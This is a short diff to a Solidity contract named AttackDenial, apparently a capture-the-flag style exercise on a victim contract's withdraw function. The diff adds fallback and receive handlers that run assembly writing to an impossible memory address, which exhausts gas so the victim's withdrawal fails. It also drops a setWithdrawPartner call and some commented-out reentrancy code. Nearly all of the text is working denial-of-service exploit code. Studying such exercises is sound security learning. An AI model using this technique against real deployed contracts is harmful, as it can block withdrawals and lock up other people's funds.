@@ -10,15 +10,19 @@ contract AttackDenial {
         denialContract = victimContract;
     }
 
+    fallback() payable external {
+        assembly {
+            mstore(not(0),1)
+        }
+    }
+
     receive() payable external {
-//        console.log(denialContract.contractBalance());
-//        if (gasleft() > 5) {
-//            denialContract.withdraw();
-//        }
+        assembly {
+            mstore(not(0),1)
+        }
     }
 
     function attack() public {
-        denialContract.setWithdrawPartner(address(this));
         denialContract.withdraw();
     }
 
